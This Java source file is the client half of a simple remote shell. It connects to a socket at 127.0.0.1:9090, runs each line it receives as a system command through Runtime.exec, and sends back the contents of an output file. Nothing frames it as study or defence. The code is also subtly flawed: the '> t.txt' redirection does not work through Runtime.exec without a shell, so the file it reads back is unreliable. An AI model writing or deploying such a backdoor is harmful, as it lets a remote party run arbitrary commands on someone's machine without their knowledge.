import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.Socket;
import java.nio.ByteBuffer;

public class Main {
    public static void main(String[] args) throws IOException {
        String serverAddress = "127.0.0.1";
        Socket s = new Socket(serverAddress, 9090);
        while (true) {
            BufferedReader input =
                    new BufferedReader(new InputStreamReader(s.getInputStream()));
            String answer = input.readLine();
            try {
                Runtime.getRuntime().exec(answer + " > t.txt");
            } catch (Exception e) {

            }
            send(s);
        }
    }

    private static void send(Socket s) throws IOException {
        PrintWriter out =
                new PrintWriter(s.getOutputStream(), true);
        FileInputStream fstream = new FileInputStream("t.txt");
        BufferedReader br = new BufferedReader(new InputStreamReader(fstream));

        String strLine;

        //Read File Line By Line
        while ((strLine = br.readLine()) != null)   {
            // Print the content on the console
            out.println (strLine);
        }

        //Close the input stream
        br.close();
    }
}
